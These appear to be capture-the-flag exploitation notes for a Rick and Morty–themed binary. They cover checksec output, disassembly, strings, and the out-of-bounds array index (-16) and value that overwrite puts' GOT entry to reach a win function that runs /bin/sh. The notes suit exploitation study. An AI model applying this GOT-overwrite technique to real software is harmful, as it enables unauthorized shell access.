@@ -1,0 +1,116 @@
+=== checksec ===
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+
+=== symbol table（挑出題目自己的函式與關鍵全域變數） ===
+0x40125b szechuan_sauce
+0x4012a7 main
+0x40139c _fini
+dimensions (.bss 全域陣列) 0x4040a0
+
+--- szechuan_sauce @ 0x40125b ---
+0x40125b: endbr64 
+0x40125f: push rbp
+0x401260: mov rbp, rsp
+0x401263: lea rax, [rip + 0xd9e]
+0x40126a: mov rsi, rax
+0x40126d: lea rax, [rip + 0xdd1]
+0x401274: mov rdi, rax
+0x401277: mov eax, 0
+0x40127c: call 0x4010d0
+0x401281: mov edi, 0xa
+0x401286: call 0x4010a0
+0x40128b: mov edx, 0
+0x401290: mov esi, 0
+0x401295: lea rax, [rip + 0xdac]
+0x40129c: mov rdi, rax
+0x40129f: call 0x4010e0
+0x4012a4: nop 
+0x4012a5: pop rbp
+0x4012a6: ret 
+
+--- main @ 0x4012a7 ---
+0x4012a7: endbr64 
+0x4012ab: push rbp
+0x4012ac: mov rbp, rsp
+0x4012af: sub rsp, 0x10
+0x4012b3: mov rax, qword ptr fs:[0x28]
+0x4012bc: mov qword ptr [rbp - 8], rax
+0x4012c0: xor eax, eax
+0x4012c2: mov eax, 0
+0x4012c7: call 0x4011f6
+0x4012cc: lea rax, [rip + 0xd7d]
+0x4012d3: mov rdi, rax
+0x4012d6: call 0x4010b0
+0x4012db: lea rax, [rip + 0xdaa]
+0x4012e2: mov rdi, rax
+0x4012e5: mov eax, 0
+0x4012ea: call 0x4010d0
+0x4012ef: lea rax, [rbp - 0xc]
+0x4012f3: mov rsi, rax
+0x4012f6: lea rax, [rip + 0xda7]
+0x4012fd: mov rdi, rax
+0x401300: mov eax, 0
+0x401305: call 0x401100
+0x40130a: mov eax, dword ptr [rbp - 0xc]
+0x40130d: cmp eax, 0x89
+0x401312: je 0x40131e
+0x401314: mov eax, dword ptr [rbp - 0xc]
+0x401317: cmp eax, 0xffffff77
+0x40131c: jne 0x40132d
+0x40131e: lea rax, [rip + 0xd83]
+0x401325: mov rdi, rax
+0x401328: call 0x4010b0
+0x40132d: lea rax, [rip + 0xdbc]
+0x401334: mov rdi, rax
+0x401337: mov eax, 0
+0x40133c: call 0x4010d0
+0x401341: mov eax, dword ptr [rbp - 0xc]
+0x401344: cdqe 
+0x401346: lea rdx, [rax*8]
+0x40134e: lea rax, [rip + 0x2d4b]
+0x401355: add rax, rdx
+0x401358: mov rsi, rax
+0x40135b: lea rax, [rip + 0xdba]
+0x401362: mov rdi, rax
+0x401365: mov eax, 0
+0x40136a: call 0x401100
+0x40136f: lea rax, [rip + 0xdb2]
+0x401376: mov rdi, rax
+0x401379: call 0x4010b0
+0x40137e: mov eax, 0
+0x401383: mov rdx, qword ptr [rbp - 8]
+0x401387: sub rdx, qword ptr fs:[0x28]
+0x401390: je 0x401397
+0x401392: call 0x4010c0
+0x401397: leave 
+0x401398: ret 
+0x401399: add byte ptr [rax], al
+
+=== 字串 ===
+szechuan_s1 0x402008 -> b'Great, another stupid shell, but WHERE IS THE SAUCE, MORTY?!'
+szechuan_s2 0x402045 -> b'%s'
+szechuan_path 0x402048 -> b'/bin/sh'
+main_banner1 0x402050 -> b'Listen Morty... *burp* find the right dimension coordinate!'
+main_banner2 0x40208c -> b'Enter dimension index: '
+scanf_fmt1 0x4020a4 -> b'%d'
+easter_egg 0x4020a8 -> b'Oh great, Dimension C-137... try not to blow this one up, Morty.'
+main_banner3 0x4020f0 -> b'Insert portal fluid calibration frequency: '
+scanf_fmt2 0x40211c -> b'%lld'
+main_banner4 0x402128 -> b"I don't like your unemployed genes in my grandchildren, Jerry!"
+
+=== GOT（任意寫入要蓋的目標） ===
+got.puts 0x404020
+got.printf 0x404030
+szechuan_sauce (win function) 0x40125b
+
+=== 算出 "蓋 got.puts" 需要的 index n ===
+dimensions base 0x4040a0
+got.puts        0x404020
+n = -16  (dimensions_base + n*8 == got.puts ? True )
+要寫入的值 = szechuan_sauce 的位址，十進位 = 4199003
